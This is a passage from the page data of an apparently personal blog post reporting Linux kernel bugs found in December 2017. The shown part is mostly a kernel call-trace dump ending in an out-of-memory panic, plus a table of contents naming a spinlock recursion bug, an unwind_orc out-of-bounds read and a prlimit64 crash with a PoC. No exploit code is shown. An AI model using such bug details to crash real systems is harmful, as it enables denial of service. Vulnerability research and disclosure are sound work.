number\">61.902020</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x15b</span><span class=\"token operator\">/</span><span class=\"token number\">0x430</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.902209</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_downgrade<span class=\"token operator\">+</span><span class=\"token number\">0x690</span><span class=\"token operator\">/</span><span class=\"token number\">0x690</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.902401</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kvm_sched_clock_read<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.902607</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_release<span class=\"token operator\">+</span><span class=\"token number\">0xff0</span><span class=\"token operator\">/</span><span class=\"token number\">0xff0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.902791</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> do_raw_spin_trylock<span class=\"token operator\">+</span><span class=\"token number\">0x180</span><span class=\"token operator\">/</span><span class=\"token number\">0x180</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.903006</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> _raw_spin_unlock_irqrestore<span class=\"token operator\">+</span><span class=\"token number\">0x46</span><span class=\"token operator\">/</span><span class=\"token number\">0x60</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.903245</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> trace_hardirqs_on_caller<span class=\"token operator\">+</span><span class=\"token number\">0x381</span><span class=\"token operator\">/</span><span class=\"token number\">0x570</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.903476</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> remove_wait_queue<span class=\"token operator\">+</span><span class=\"token number\">0x188</span><span class=\"token operator\">/</span><span class=\"token number\">0x250</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.903678</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.903854</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x15b</span><span class=\"token operator\">/</span><span class=\"token number\">0x430</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.904036</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __do_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0x2f6</span><span class=\"token operator\">/</span><span class=\"token number\">0xb50</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.904225</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> do_wait<span class=\"token operator\">+</span><span class=\"token number\">0x425</span><span class=\"token operator\">/</span><span class=\"token number\">0xa20</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.904389</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_release<span class=\"token operator\">+</span><span class=\"token number\">0xff0</span><span class=\"token operator\">/</span><span class=\"token number\">0xff0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.904572</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> wait_consider_task<span class=\"token operator\">+</span><span class=\"token number\">0x3500</span><span class=\"token operator\">/</span><span class=\"token number\">0x3500</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.904796</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcu_note_context_switch<span class=\"token operator\">+</span><span class=\"token number\">0x6e0</span><span class=\"token operator\">/</span><span class=\"token number\">0x6e0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905021</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> cpu_extra_stat_show<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905231</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> handle_mm_fault<span class=\"token operator\">+</span><span class=\"token number\">0x12e</span><span class=\"token operator\">/</span><span class=\"token number\">0x390</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905429</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __do_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0x4fa</span><span class=\"token operator\">/</span><span class=\"token number\">0xb50</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905627</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> vmalloc_fault<span class=\"token operator\">+</span><span class=\"token number\">0x930</span><span class=\"token operator\">/</span><span class=\"token number\">0x930</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905813</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> SyS_waitid<span class=\"token operator\">+</span><span class=\"token number\">0x40</span><span class=\"token operator\">/</span><span class=\"token number\">0x40</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.905986</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> do_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0xb5</span><span class=\"token operator\">/</span><span class=\"token number\">0x5b0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.906176</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __do_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0xb50</span><span class=\"token operator\">/</span><span class=\"token number\">0xb50</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.906372</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> SYSC_wait4<span class=\"token operator\">+</span><span class=\"token number\">0x95</span><span class=\"token operator\">/</span><span class=\"token number\">0x110</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.906543</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kernel_wait4<span class=\"token operator\">+</span><span class=\"token number\">0x330</span><span class=\"token operator\">/</span><span class=\"token number\">0x330</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.906728</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> syscall_return_slowpath<span class=\"token operator\">+</span><span class=\"token number\">0x2cd</span><span class=\"token operator\">/</span><span class=\"token number\">0x450</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.906957</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> entry_SYSCALL_64_fastpath<span class=\"token operator\">+</span><span class=\"token number\">0x4b</span><span class=\"token operator\">/</span><span class=\"token number\">0x96</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.907192</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> async_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0x36</span><span class=\"token operator\">/</span><span class=\"token number\">0x60</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.907393</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> trace_hardirqs_off_thunk<span class=\"token operator\">+</span><span class=\"token number\">0x1a</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.907618</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> async_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0x36</span><span class=\"token operator\">/</span><span class=\"token number\">0x60</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.907810</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> async_page_fault<span class=\"token operator\">+</span><span class=\"token number\">0x4c</span><span class=\"token operator\">/</span><span class=\"token number\">0x60</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.908170</span><span class=\"token punctuation\">]</span> Kernel Offset<span class=\"token operator\">:</span> <span class=\"token number\">0x2b200000</span> from <span class=\"token number\">0xffffffff81000000</span> <span class=\"token punctuation\">(</span>relocation range<span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff80000000</span><span class=\"token operator\">-</span><span class=\"token number\">0xffffffffbfffffff</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.908670</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token punctuation\">[</span> end Kernel panic <span class=\"token operator\">-</span> not syncing<span class=\"token operator\">:</span> Out of memory and no killable processes<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.908670</span><span class=\"token punctuation\">]</span></code></pre></div>\n<p>As a result, kernel panic is triggered because of OOM (Out Of Memory).</p>\n<p><strong>End</strong></p>","excerpt":"spin-lock recursion bug (leading to deadlock) There's no recursion check on spinlock where I found it (not exact). So when executed recursi…","tableOfContents":"<ul>\n<li>\n<p><a href=\"#spin-lock-recursion-bug-leading-to-deadlock\">spin-lock recursion bug (leading to deadlock)</a></p>\n<ul>\n<li><a href=\"#call-trace-dump\">Call Trace (Dump)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#unwind_orc---stack-out-of-bound\">unwind_orc - stack out-of-bound</a></p>\n<ul>\n<li><a href=\"#before--after\">Before &#x26; After</a></li>\n<li><a href=\"#call-trace-dump-1\">Call Trace (Dump)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#prlimit64-leading-to-kernel-panic\">prlimit64 (leading to kernel panic)</a></p>\n<ul>\n<li><a href=\"#poc\">PoC</a></li>\n<li><a href=\"#call-trace-dump-2\">Call Trace (Dump)</a></li>\n</ul>\n</li>\n</ul>","fields":{"slug":"/2017-12-LK-Founds/"},"frontmatter":{"title":"Linux Kernel - 2017-12 Founds","date":"Dec 10, 2017","tags":["Security","Linux-Kernel"],"keywords":["0-day","Bug"],"update":"Dec 20, 2017"},"timeToRead":11}},"pageContext":{"slug":"/2017-12-LK-Founds/","series":[],"lastmod":"2017-12-20"}},"staticQueryHashes":["2027115977","2744905544","694178885"]}